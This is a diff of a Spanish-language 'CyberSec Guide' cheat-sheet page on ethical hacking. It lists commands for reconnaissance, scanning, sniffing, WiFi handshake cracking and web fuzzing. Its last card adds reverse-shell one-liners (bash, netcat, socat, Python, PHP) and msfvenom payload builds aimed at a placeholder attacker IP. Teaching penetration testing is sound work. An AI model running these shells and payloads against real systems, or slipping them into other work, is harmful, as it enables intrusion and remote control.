@@ -17,35 +17,109 @@
     <nav class="navbar-cyber navbar-expand-lg">
         <div class="container-fluid">
             <a class="navbar-brand" href="index.html"><i class="fas fa-shield-halved"></i><span>CyberSec Guide</span></a>
-            <div class="d-flex align-items-center navbar-actions">
-                <button class="theme-toggle" id="themeToggle" aria-label="Cambiar tema">
-                    <i class="fas fa-moon"></i>
-                    <span>Dark</span>
-                </button>
+            <div class="navbar-actions">
                 <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav"><span class="navbar-toggler-icon"></span></button>
+            </div>
             <div class="collapse navbar-collapse" id="navbarNav">
-                <ul class="navbar-nav ms-auto">
+                <ul class="navbar-nav">
                     <li class="nav-item"><a class="nav-link" href="index.html">Inicio</a></li>
                     <li class="nav-item dropdown">
-                        <a class="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown">Secciones <i class="fas fa-chevron-down" style="font-size:0.6rem;margin-left:4px;"></i></a>
-                        <ul class="dropdown-menu">
-                            <li><a class="dropdown-item" href="secciones/01-introduccion.html"><span class="dropdown-num">01</span> Introducción</a></li>
-                            <li><a class="dropdown-item" href="secciones/02-amenazas.html"><span class="dropdown-num">02</span> Amenazas</a></li>
-                            <li><a class="dropdown-item" href="secciones/03-redes.html"><span class="dropdown-num">03</span> Redes</a></li>
-                            <li><a class="dropdown-item" href="secciones/04-criptografia.html"><span class="dropdown-num">04</span> Criptografía</a></li>
-                            <li><a class="dropdown-item" href="secciones/05-sistemas.html"><span class="dropdown-num">05</span> Seguridad SO</a></li>
-                            <li><a class="dropdown-item" href="secciones/06-hacking.html"><span class="dropdown-num">06</span> Hacking Ético</a></li>
-                            <li><a class="dropdown-item" href="secciones/07-seguridad-web.html"><span class="dropdown-num">07</span> Seguridad Web</a></li>
-                            <li><a class="dropdown-item" href="secciones/08-forense.html"><span class="dropdown-num">08</span> Forense Digital</a></li>
-                            <li><a class="dropdown-item" href="secciones/09-normativas.html"><span class="dropdown-num">09</span> Normativas</a></li>
-                            <li><a class="dropdown-item" href="secciones/10-certificaciones.html"><span class="dropdown-num">10</span> Certificaciones</a></li>
-                        </ul>
+                        <a class="nav-link dropdown-toggle" href="#" role="button" aria-haspopup="true" aria-expanded="false">Secciones <i class="fas fa-chevron-down" style="font-size:0.6rem;margin-left:4px;"></i></a>
+                                                <div class="dropdown-menu">
+                            <div class="dropdown-grid">
+                                <a class="dropdown-item" href="secciones/01-introduccion.html">
+                                    <span class="dropdown-num">01</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Introducción</span>
+                                        <span class="dropdown-item-desc">Fundamentos</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                                <a class="dropdown-item" href="secciones/02-amenazas.html">
+                                    <span class="dropdown-num">02</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Amenazas</span>
+                                        <span class="dropdown-item-desc">Malware y phishing</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                                <a class="dropdown-item" href="secciones/03-redes.html">
+                                    <span class="dropdown-num">03</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Redes</span>
+                                        <span class="dropdown-item-desc">Protocolos y firewalls</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                                <a class="dropdown-item" href="secciones/04-criptografia.html">
+                                    <span class="dropdown-num">04</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Criptografía</span>
+                                        <span class="dropdown-item-desc">Cifrado y hashing</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                                <a class="dropdown-item" href="secciones/05-sistemas.html">
+                                    <span class="dropdown-num">05</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Seguridad SO</span>
+                                        <span class="dropdown-item-desc">Hardening</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                                <a class="dropdown-item" href="secciones/06-hacking.html">
+                                    <span class="dropdown-num">06</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Hacking Ético</span>
+                                        <span class="dropdown-item-desc">Pentesting</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                                <a class="dropdown-item" href="secciones/07-seguridad-web.html">
+                                    <span class="dropdown-num">07</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Seguridad Web</span>
+                                        <span class="dropdown-item-desc">OWASP Top 10</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                                <a class="dropdown-item" href="secciones/08-forense.html">
+                                    <span class="dropdown-num">08</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Forense Digital</span>
+                                        <span class="dropdown-item-desc">Análisis</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                                <a class="dropdown-item" href="secciones/09-normativas.html">
+                                    <span class="dropdown-num">09</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Normativas</span>
+                                        <span class="dropdown-item-desc">ISO y GDPR</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                                <a class="dropdown-item" href="secciones/10-certificaciones.html">
+                                    <span class="dropdown-num">10</span>
+                                    <div class="dropdown-item-content">
+                                        <span class="dropdown-item-title">Certificaciones</span>
+                                        <span class="dropdown-item-desc">CEH y OSCP</span>
+                                    </div>
+                                    <i class="fas fa-chevron-right dropdown-item-arrow"></i>
+                                </a>
+                            </div>
+                        </div>
+
                     </li>
                     <li class="nav-item"><a class="nav-link" href="herramientas.html">Herramientas</a></li>
                     <li class="nav-item"><a class="nav-link active" href="comandos.html">Comandos</a></li>
                     <li class="nav-item"><a class="nav-link" href="recursos.html">Recursos</a></li>
                     <li class="nav-item"><a class="nav-link" href="index.html#about">Acerca de</a></li>
                 </ul>
+            </div>
+            <div class="navbar-icons">
+                <button class="search-toggle" aria-label="Buscar"><i class="fas fa-search"></i></button>
+                <button class="theme-toggle" id="themeToggle" aria-label="Cambiar tema"><i class="fas fa-moon"></i></button>
             </div>
         </div>
     </nav>
@@ -60,94 +134,839 @@
             <div class="row g-4">
                 <div class="col-lg-6" data-animate>
                     <div class="card-cyber h-100">
-                        <div class="card-title"><i class="fas fa-network-wired" style="color: var(--primary); margin-right:8px;"></i> Nmap - Escáner de Red</div>
+                        <div class="card-title"><i class="fas fa-search" style="color: #ff6d00; margin-right:8px;"></i> Reconocimiento y OSINT</div>
                         <div class="code-block" style="margin:0;">
-                            <code>nmap -sV -sC -O -A objetivo.com    <span class="code-comment"># Escaneo completo</span>
-nmap -p- --min-rate 5000 objetivo    <span class="code-comment"># Todos los puertos</span>
-nmap --script vuln objetivo         <span class="code-comment"># Scan de vulnerabilidades</span>
-nmap -sU -p 53,123 objetivo        <span class="code-comment"># Escaneo UDP</span>
-nmap -sS -T4 objetivo               <span class="code-comment"># SYN stealth scan</span></code>
+                            <div class="cmd-row"><code>theHarvester -d ejemplo.com -b all</code><span class="cmd-desc">Emails, hosts y subdominios</span></div>
+                            <div class="cmd-row"><code>amass enum -d ejemplo.com</code><span class="cmd-desc">Enumeración de activos</span></div>
+                            <div class="cmd-row"><code>subfinder -d ejemplo.com -silent</code><span class="cmd-desc">Subdominios (pasivo)</span></div>
+                            <div class="cmd-row"><code>sherlock usuario</code><span class="cmd-desc">Buscar usuario en redes</span></div>
+                            <div class="cmd-row"><code>shodan search "country:AR product:nginx"</code><span class="cmd-desc">Buscar dispositivos en Shodan</span></div>
+                            <div class="cmd-row"><code>curl -s "https://crt.sh/?q=%25.ejemplo.com&amp;output=json" | jq .</code><span class="cmd-desc">Certificados (CT logs)</span></div>
+                            <div class="cmd-row"><code>curl https://api.hackertarget.com/reversedns/?q=IP</code><span class="cmd-desc">Reverse DNS</span></div>
+                            <div class="cmd-row"><code>whois ejemplo.com</code><span class="cmd-desc">Información del dominio</span></div>
+                            <div class="cmd-row"><code>recon-ng</code><span class="cmd-desc">Framework OSINT</span></div>
+                            <div class="cmd-row"><code>spiderfoot -s ejemplo.com -m all</code><span class="cmd-desc">Recolección automatizada</span></div>
+                            <div class="cmd-row"><code>traceroute -m 30 ejemplo.com</code><span class="cmd-desc">Traza completa</span></div>
                         </div>
                     </div>
                 </div>
                 <div class="col-lg-6" data-animate data-delay="50">
                     <div class="card-cyber h-100">
-                        <div class="card-title"><i class="fas fa-terminal" style="color: var(--accent); margin-right:8px;"></i> Linux - Auditoría</div>
+                        <div class="card-title"><i class="fas fa-globe" style="color: #ff6d00; margin-right:8px;"></i> DNS - Reconocimiento</div>
                         <div class="code-block" style="margin:0;">
-                            <code>chmod 700 ~/ssh_keys             <span class="code-comment"># Permisos seguros</span>
-find / -perm /4000 -type f        <span class="code-comment"># Archivos SUID</span>
-sudo netstat -tulpn              <span class="code-comment"># Puertos abiertos</span>
-ss -tulpn                        <span class="code-comment"># Conexiones activas</span>
-cat /etc/passwd | cut -d: -f1    <span class="code-comment"># Usuarios del sistema</span></code>
+                            <div class="cmd-row"><code>dig ejemplo.com ANY</code><span class="cmd-desc">Todos los registros</span></div>
+                            <div class="cmd-row"><code>dig @8.8.8.8 MX ejemplo.com</code><span class="cmd-desc">Registros MX</span></div>
+                            <div class="cmd-row"><code>dig -x 8.8.8.8</code><span class="cmd-desc">Reverse DNS</span></div>
+                            <div class="cmd-row"><code>dig @ns1.dominio.com dominio.com AXFR</code><span class="cmd-desc">Transferencia de zona</span></div>
+                            <div class="cmd-row"><code>host -t txt ejemplo.com</code><span class="cmd-desc">Registros TXT</span></div>
+                            <div class="cmd-row"><code>host -l dominio.com ns1.dominio.com</code><span class="cmd-desc">Listar zona (si lo permite)</span></div>
+                            <div class="cmd-row"><code>nslookup ejemplo.com</code><span class="cmd-desc">Consulta clásica</span></div>
+                            <div class="cmd-row"><code>dnsrecon -d ejemplo.com</code><span class="cmd-desc">Reconocimiento DNS</span></div>
+                            <div class="cmd-row"><code>dnsrecon -d ejemplo.com -t axfr</code><span class="cmd-desc">Probar transferencia de zona</span></div>
+                            <div class="cmd-row"><code>dnsenum ejemplo.com</code><span class="cmd-desc">Enumeración DNS</span></div>
+                            <div class="cmd-row"><code>sublist3r -d ejemplo.com</code><span class="cmd-desc">Subdominios</span></div>
+                            <div class="cmd-row"><code>fierce --domain ejemplo.com</code><span class="cmd-desc">Barrido de subdominios</span></div>
                         </div>
                     </div>
                 </div>
                 <div class="col-lg-6" data-animate data-delay="100">
                     <div class="card-cyber h-100">
-                        <div class="card-title"><i class="fas fa-fingerprint" style="color: var(--secondary); margin-right:8px;"></i> Hashing e Integridad</div>
+                        <div class="card-title"><i class="fas fa-network-wired" style="color: var(--primary); margin-right:8px;"></i> Nmap - Escáner de Red</div>
                         <div class="code-block" style="margin:0;">
-                            <code>sha256sum archivo.pdf            <span class="code-comment"># Hash SHA-256</span>
-md5sum archivo.pdf               <span class="code-comment"># Hash MD5</span>
-openssl passwd -6 "password"      <span class="code-comment"># Hash de contraseña</span>
-gpg --verify archivo.sig         <span class="code-comment"># Verificar firma</span>
-base64 -d encoded.txt            <span class="code-comment"># Decodificar Base64</span></code>
+                            <div class="cmd-row"><code>nmap -sn 192.168.1.0/24</code><span class="cmd-desc">Descubrir hosts vivos</span></div>
+                            <div class="cmd-row"><code>nmap -sT -T4 -p- objetivo</code><span class="cmd-desc">Todos los puertos TCP</span></div>
+                            <div class="cmd-row"><code>nmap -sS objetivo</code><span class="cmd-desc">SYN stealth scan</span></div>
+                            <div class="cmd-row"><code>nmap -sU -p 53,123 objetivo</code><span class="cmd-desc">Escaneo UDP</span></div>
+                            <div class="cmd-row"><code>nmap -sV objetivo</code><span class="cmd-desc">Detectar versiones de servicios</span></div>
+                            <div class="cmd-row"><code>nmap -O objetivo</code><span class="cmd-desc">Detectar sistema operativo</span></div>
+                            <div class="cmd-row"><code>nmap -sV -sC objetivo</code><span class="cmd-desc">Versiones + scripts por defecto</span></div>
+                            <div class="cmd-row"><code>nmap -A objetivo</code><span class="cmd-desc">Escaneo agresivo completo</span></div>
+                            <div class="cmd-row"><code>nmap --script vuln objetivo</code><span class="cmd-desc">Escanear vulnerabilidades</span></div>
+                            <div class="cmd-row"><code>nmap --script http-enum objetivo</code><span class="cmd-desc">Enumerar rutas web</span></div>
+                            <div class="cmd-row"><code>nmap -Pn -sV objetivo</code><span class="cmd-desc">Sin ping (host oculto)</span></div>
+                            <div class="cmd-row"><code>nmap -f -D RND:10 objetivo</code><span class="cmd-desc">Evasión: fragmentar + decoys</span></div>
                         </div>
                     </div>
                 </div>
                 <div class="col-lg-6" data-animate data-delay="150">
                     <div class="card-cyber h-100">
-                        <div class="card-title"><i class="fas fa-wifi" style="color: #00c853; margin-right:8px;"></i> Red - Diagnóstico</div>
+                        <div class="card-title"><i class="fas fa-rocket" style="color: var(--accent); margin-right:8px;"></i> Escaneo Masivo y Host Discovery</div>
                         <div class="code-block" style="margin:0;">
-                            <code>ping -c 4 8.8.8.8                <span class="code-comment"># Probar conectividad</span>
-traceroute google.com            <span class="code-comment"># Ruta de paquetes</span>
-dig @8.8.8.8 ejemplo.com        <span class="code-comment"># Consulta DNS</span>
-whois ejemplo.com                <span class="code-comment"># Info de dominio</span>
-curl -I https://ejemplo.com     <span class="code-comment"># Headers HTTP</span></code>
+                            <div class="cmd-row"><code>arp-scan -l</code><span class="cmd-desc">Descubrir hosts en la LAN</span></div>
+                            <div class="cmd-row"><code>nmap -sn 192.168.1.0/24</code><span class="cmd-desc">Hosts vivos con ping</span></div>
+                            <div class="cmd-row"><code>hping3 -c 4 IP</code><span class="cmd-desc">Ping alternativo (TCP/ICMP)</span></div>
+                            <div class="cmd-row"><code>hping3 -S -p 80 IP</code><span class="cmd-desc">Paquete SYN personalizado</span></div>
+                            <div class="cmd-row"><code>masscan -p1-65535 --rate=1000 IP</code><span class="cmd-desc">Escaneo masivo rápido</span></div>
+                            <div class="cmd-row"><code>masscan -p22,80,443 --rate=10000 0.0.0.0/0 -oL resultado.txt</code><span class="cmd-desc">Puertos populares en un rango</span></div>
+                            <div class="cmd-row"><code>zmap -p 443 0.0.0.0/0 -o salida.txt</code><span class="cmd-desc">Escanear Internet</span></div>
                         </div>
                     </div>
                 </div>
                 <div class="col-lg-6" data-animate data-delay="200">
                     <div class="card-cyber h-100">
-                        <div class="card-title"><i class="fas fa-signal" style="color: var(--accent); margin-right:8px;"></i> WiFi - Auditoría</div>
+                        <div class="card-title"><i class="fas fa-network-wired" style="color: var(--secondary); margin-right:8px;"></i> Enumeración de Servicios</div>
                         <div class="code-block" style="margin:0;">
-                            <code>airodump-ng wlan0mon             <span class="code-comment"># Capturar redes</span>
-aireplay-ng -9 wlan0mon          <span class="code-comment"># Inyección de paquetes</span>
-aircrack-ng -w wordlist.cap       <span class="code-comment"># Crackear handshake</span>
-hashcat -m 22000 hash.hc22k      <span class="code-comment"># Crackear PMKID</span></code>
+                            <div class="cmd-row"><code>nc -vn IP 22</code><span class="cmd-desc">Banner grab básico</span></div>
+                            <div class="cmd-row"><code>curl -sI http://IP</code><span class="cmd-desc">Banner HTTP</span></div>
+                            <div class="cmd-row"><code>enum4linux IP</code><span class="cmd-desc">Enumeración SMB/Windows</span></div>
+                            <div class="cmd-row"><code>smbclient -L //IP/</code><span class="cmd-desc">Listar shares SMB</span></div>
+                            <div class="cmd-row"><code>smbmap -H IP</code><span class="cmd-desc">Mapear shares SMB</span></div>
+                            <div class="cmd-row"><code>snmpwalk -v2c -c public IP</code><span class="cmd-desc">Información SNMP</span></div>
+                            <div class="cmd-row"><code>rpcclient -U "" -N IP -c "enumdomusers"</code><span class="cmd-desc">Usuarios vía RPC</span></div>
+                            <div class="cmd-row"><code>ldapsearch -x -H ldap://IP -b "dc=dominio,dc=com"</code><span class="cmd-desc">Consulta LDAP</span></div>
+                            <div class="cmd-row"><code>smtp-user-enum -M VRFY -U users.txt -t IP</code><span class="cmd-desc">Enumerar usuarios SMTP</span></div>
                         </div>
                     </div>
                 </div>
                 <div class="col-lg-6" data-animate data-delay="250">
                     <div class="card-cyber h-100">
-                        <div class="card-title"><i class="fas fa-lock" style="color: var(--primary); margin-right:8px;"></i> Criptografía</div>
+                        <div class="card-title"><i class="fas fa-wifi" style="color: #00c853; margin-right:8px;"></i> Red - Diagnóstico</div>
                         <div class="code-block" style="margin:0;">
-                            <code>openssl enc -aes-256-cbc -in f   <span class="code-comment"># Cifrar archivo</span>
-openssl s_client -connect h:443  <span class="code-comment"># Probar TLS</span>
-gpg -c archivo.txt               <span class="code-comment"># Cifrar con GPG</span>
-ssh-keygen -t ed25519             <span class="code-comment"># Generar clave SSH</span></code>
+                            <div class="cmd-row"><code>ip addr</code><span class="cmd-desc">Interfaces y direcciones IP</span></div>
+                            <div class="cmd-row"><code>ip route</code><span class="cmd-desc">Tabla de rutas</span></div>
+                            <div class="cmd-row"><code>ip neigh</code><span class="cmd-desc">Tabla ARP (vecinos)</span></div>
+                            <div class="cmd-row"><code>ping -c 4 8.8.8.8</code><span class="cmd-desc">Probar conectividad</span></div>
+                            <div class="cmd-row"><code>traceroute -I google.com</code><span class="cmd-desc">Ruta con ICMP</span></div>
+                            <div class="cmd-row"><code>nc -zv 192.168.1.1 1-100</code><span class="cmd-desc">Escanear puertos TCP</span></div>
+                            <div class="cmd-row"><code>whois ejemplo.com</code><span class="cmd-desc">Información del dominio</span></div>
+                            <div class="cmd-row"><code>curl -I https://ejemplo.com</code><span class="cmd-desc">Cabeceras HTTP</span></div>
                         </div>
                     </div>
                 </div>
                 <div class="col-lg-6" data-animate data-delay="300">
                     <div class="card-cyber h-100">
-                        <div class="card-title"><i class="fas fa-database" style="color: var(--secondary); margin-right:8px;"></i> Metasploit</div>
+                        <div class="card-title"><i class="fas fa-eye" style="color: #26a69a; margin-right:8px;"></i> Sniffing y Análisis de Tráfico</div>
                         <div class="code-block" style="margin:0;">
-                            <code>msfconsole                         <span class="code-comment"># Iniciar framework</span>
-search eternalblue                <span class="code-comment"># Buscar exploits</span>
-use exploit/windows/smb/ms17_010  <span class="code-comment"># Seleccionar exploit</span>
-set RHOSTS 192.168.1.100        <span class="code-comment"># Objetivo</span>
-exploit                           <span class="code-comment"># Ejecutar</span></code>
+                            <div class="cmd-row"><code>tcpdump -i eth0 -w captura.pcap</code><span class="cmd-desc">Capturar tráfico</span></div>
+                            <div class="cmd-row"><code>tcpdump -i eth0 -nn -s 0 port 80</code><span class="cmd-desc">Sin resolución DNS</span></div>
+                            <div class="cmd-row"><code>tcpdump -A -i eth0</code><span class="cmd-desc">Ver paquetes en ASCII</span></div>
+                            <div class="cmd-row"><code>tcpdump -i eth0 'tcp port 443 and host 10.0.0.5'</code><span class="cmd-desc">Filtro combinado</span></div>
+                            <div class="cmd-row"><code>tshark -r captura.pcap</code><span class="cmd-desc">Analizar captura</span></div>
+                            <div class="cmd-row"><code>tshark -i eth0 -Y "http.request"</code><span class="cmd-desc">Filtrar HTTP en vivo</span></div>
+                            <div class="cmd-row"><code>tshark -r captura.pcap -Y "http.request" -T fields -e http.host</code><span class="cmd-desc">Extraer hosts</span></div>
+                            <div class="cmd-row"><code>ettercap -T -M arp:remote /IP1// /IP2//</code><span class="cmd-desc">MitM ARP</span></div>
+                            <div class="cmd-row"><code>bettercap -iface eth0</code><span class="cmd-desc">Suite de ataque MITM</span></div>
+                            <div class="cmd-row"><code>ngrep -q 'password' -d eth0</code><span class="cmd-desc">Buscar credenciales</span></div>
+                            <div class="cmd-row"><code>strings captura.pcap | grep -i pass</code><span class="cmd-desc">Buscar contraseñas en el pcap</span></div>
                         </div>
                     </div>
                 </div>
                 <div class="col-lg-6" data-animate data-delay="350">
                     <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-signal" style="color: var(--accent); margin-right:8px;"></i> WiFi - Auditoría</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>airmon-ng start wlan0</code><span class="cmd-desc">Activar modo monitor</span></div>
+                            <div class="cmd-row"><code>airmon-ng stop wlan0mon</code><span class="cmd-desc">Volver a modo managed</span></div>
+                            <div class="cmd-row"><code>airodump-ng wlan0mon</code><span class="cmd-desc">Capturar redes cercanas</span></div>
+                            <div class="cmd-row"><code>airodump-ng -c 6 --bssid XX:XX:XX:XX:XX:XX -w captura wlan0mon</code><span class="cmd-desc">Capturar handshake</span></div>
+                            <div class="cmd-row"><code>aireplay-ng -9 wlan0mon</code><span class="cmd-desc">Probar inyección</span></div>
+                            <div class="cmd-row"><code>aireplay-ng -0 5 -a XX:XX:XX:XX:XX:XX wlan0mon</code><span class="cmd-desc">Deauth para capturar el 4-way</span></div>
+                            <div class="cmd-row"><code>aircrack-ng -w wordlist.txt captura.cap</code><span class="cmd-desc">Crackear handshake</span></div>
+                            <div class="cmd-row"><code>hashcat -m 22000 hash.hc22000 wordlist.txt</code><span class="cmd-desc">Crackear WPA2 con GPU</span></div>
+                            <div class="cmd-row"><code>wash -i wlan0mon</code><span class="cmd-desc">Detectar redes WPS</span></div>
+                            <div class="cmd-row"><code>reaver -i wlan0mon -b XX:XX:XX:XX:XX:XX -c 6 -vv</code><span class="cmd-desc">Ataque WPS</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="375">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-mask" style="color: var(--secondary); margin-right:8px;"></i> WiFi - Conexión y Anonimato</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>sudo macchanger -r wlan0</code><span class="cmd-desc">Cambiar MAC aleatoria</span></div>
+                            <div class="cmd-row"><code>sudo airmon-ng stop wlan0mon</code><span class="cmd-desc">Volver a modo managed</span></div>
+                            <div class="cmd-row"><code>wpa_passphrase "NombreRed" "clave" &gt; wifi.conf</code><span class="cmd-desc">Generar config WPA/WPA2</span></div>
+                            <div class="cmd-row"><code>sudo wpa_supplicant -i wlan0 -c wifi.conf -B</code><span class="cmd-desc">Conectar a la red (Linux)</span></div>
+                            <div class="cmd-row"><code>sudo dhclient wlan0</code><span class="cmd-desc">Obtener IP por DHCP</span></div>
+                            <div class="cmd-row"><code>sudo dhcpcd wlan0</code><span class="cmd-desc">Alternativa de DHCP</span></div>
+                            <div class="cmd-row"><code>netsh wlan add profile filename=perfil.xml</code><span class="cmd-desc">Importar perfil (Windows)</span></div>
+                            <div class="cmd-row"><code>netsh wlan connect name="NombreRed"</code><span class="cmd-desc">Conectar a la red (Windows)</span></div>
+                            <div class="cmd-row"><code>sudo openvpn --config servidor.ovpn</code><span class="cmd-desc">Conectar a una VPN</span></div>
+                            <div class="cmd-row"><code>sudo systemctl start tor</code><span class="cmd-desc">Iniciar Tor para privacidad</span></div>
+                            <div class="cmd-row"><code>proxychains4 curl https://check.torproject.org</code><span class="cmd-desc">Verificar salida por Tor</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="400">
+                    <div class="card-cyber h-100">
                         <div class="card-title"><i class="fas fa-globe" style="color: #00c853; margin-right:8px;"></i> Web - Análisis</div>
                         <div class="code-block" style="margin:0;">
-                            <code>nikto -h https://objetivo.com     <span class="code-comment"># Scanner web</span>
-dirb https://objetivo.com        <span class="code-comment"># Fuzzing directorios</span>
-sqlmap -u "url?id=1" --dbs      <span class="code-comment"># SQL Injection</span>
-wfuzz -c -z file,wordlist.txt    <span class="code-comment"># Fuzzing</span></code>
+                            <div class="cmd-row"><code>whatweb https://objetivo.com</code><span class="cmd-desc">Detectar tecnologías</span></div>
+                            <div class="cmd-row"><code>nikto -h https://objetivo.com</code><span class="cmd-desc">Escáner de vulnerabilidades</span></div>
+                            <div class="cmd-row"><code>gobuster dir -u https://objetivo.com -w wordlist.txt</code><span class="cmd-desc">Directorios</span></div>
+                            <div class="cmd-row"><code>dirb https://objetivo.com</code><span class="cmd-desc">Directorios clásico</span></div>
+                            <div class="cmd-row"><code>wfuzz -c -z file,wordlist.txt -u https://objetivo.com/FUZZ</code><span class="cmd-desc">Fuzzing de rutas</span></div>
+                            <div class="cmd-row"><code>wpscan --url sitio.com</code><span class="cmd-desc">WordPress</span></div>
+                            <div class="cmd-row"><code>nuclei -u https://objetivo.com</code><span class="cmd-desc">Plantillas de CVEs</span></div>
+                            <div class="cmd-row"><code>sqlmap -u "url?id=1" --dbs</code><span class="cmd-desc">SQL Injection</span></div>
+                            <div class="cmd-row"><code>testssl.sh objetivo.com</code><span class="cmd-desc">Auditoría TLS completa</span></div>
+                            <div class="cmd-row"><code>sslscan objetivo.com</code><span class="cmd-desc">Cifrados y protocolos</span></div>
+                            <div class="cmd-row"><code>curl -sk https://objetivo.com</code><span class="cmd-desc">Fetch sin validar el certificado</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="450">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-bug" style="color: #e040fb; margin-right:8px;"></i> Fuzzing Web</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>ffuf -w wordlist.txt:FUZZ -u https://objetivo.com/FUZZ</code><span class="cmd-desc">Fuzzing de rutas</span></div>
+                            <div class="cmd-row"><code>ffuf -w wordlist.txt:FUZZ -u https://objetivo.com/FUZZ -mc 200,301</code><span class="cmd-desc">Filtrar códigos de respuesta</span></div>
+                            <div class="cmd-row"><code>ffuf -w wordlist.txt:U -u "https://objetivo.com/consulta?param=U"</code><span class="cmd-desc">Fuzzing de parámetros GET</span></div>
+                            <div class="cmd-row"><code>gobuster dir -u https://objetivo.com -w wordlist.txt -t 50</code><span class="cmd-desc">Directorios rápido</span></div>
+                            <div class="cmd-row"><code>gobuster vhost -u https://objetivo.com -w wordlist.txt</code><span class="cmd-desc">Virtual hosts</span></div>
+                            <div class="cmd-row"><code>gobuster dns -d dominio.com -w wordlist.txt</code><span class="cmd-desc">Subdominios</span></div>
+                            <div class="cmd-row"><code>feroxbuster -u https://objetivo.com -w wordlist.txt</code><span class="cmd-desc">Fuzzing recursivo</span></div>
+                            <div class="cmd-row"><code>dirsearch -u https://objetivo.com -e php,html,txt</code><span class="cmd-desc">Extensiones comunes</span></div>
+                            <div class="cmd-row"><code>wfuzz -c -z file,wordlist.txt -u https://objetivo.com/FUZZ</code><span class="cmd-desc">WFuzz alternativo</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="500">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-braces" style="color: #00c853; margin-right:8px;"></i> Web - Herramientas Avanzadas</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>subfinder -d objetivo.com -silent</code><span class="cmd-desc">Subdominios</span></div>
+                            <div class="cmd-row"><code>httpx -l urls.txt -sc -title -tech-detect</code><span class="cmd-desc">Hosts vivos y tecnologías</span></div>
+                            <div class="cmd-row"><code>katana -u https://objetivo.com -jc</code><span class="cmd-desc">Crawler (ProjectDiscovery)</span></div>
+                            <div class="cmd-row"><code>waybackurls objetivo.com</code><span class="cmd-desc">URLs históricas</span></div>
+                            <div class="cmd-row"><code>hakrawler -url https://objetivo.com</code><span class="cmd-desc">Crawler de endpoints</span></div>
+                            <div class="cmd-row"><code>wafw00f https://objetivo.com</code><span class="cmd-desc">Detectar WAF</span></div>
+                            <div class="cmd-row"><code>arjun -u https://objetivo.com</code><span class="cmd-desc">Descubrir parámetros</span></div>
+                            <div class="cmd-row"><code>paramspider -d objetivo.com</code><span class="cmd-desc">Parámetros ocultos</span></div>
+                            <div class="cmd-row"><code>xssstrike -u "url?param=x"</code><span class="cmd-desc">Detectar XSS</span></div>
+                            <div class="cmd-row"><code>jwt_tool &lt;token&gt;</code><span class="cmd-desc">Analizar y atacar JWT</span></div>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-6" data-animate data-delay="550">
+                    <div class="card-cyber h-100">
+                        <div class="card-title"><i class="fas fa-skull" style="color: var(--accent); margin-right:8px;"></i> Explotación y Reverse Shells</div>
+                        <div class="code-block" style="margin:0;">
+                            <div class="cmd-row"><code>nc -lvnp 4444</code><span class="cmd-desc">Listener (atacante)</span></div>
+                            <div class="cmd-row"><code>bash -i &gt; /dev/tcp/IP/4444 0&gt;&amp;1</code><span class="cmd-desc">Reverse shell Bash</span></div>
+                            <div class="cmd-row"><code>nc -e /bin/sh IP 4444</code><span class="cmd-desc">Reverse shell Netcat</span></div>
+                            <div class="cmd-row"><code>socat TCP:IP:4444 EXEC:/bin/bash</code><span class="cmd-desc">Reverse shell Socat</span></div>
+                            <div class="cmd-row"><code>python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'</code><span class="cmd-desc">Reverse shell Python</span></div>
+                            <div class="cmd-row"><code>php -r '$sock=fsockopen("IP",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code><span class="cmd-desc">Reverse shell PHP</span></div>
+                            <div class="cmd-row"><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f elf &gt; shell.elf</code><span class="cmd-desc">Payload Linux</span></div>
+                            <div class="cmd-row"><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe &gt; shell.exe</code><span class="cmd-desc">Payload Windows</span></div>
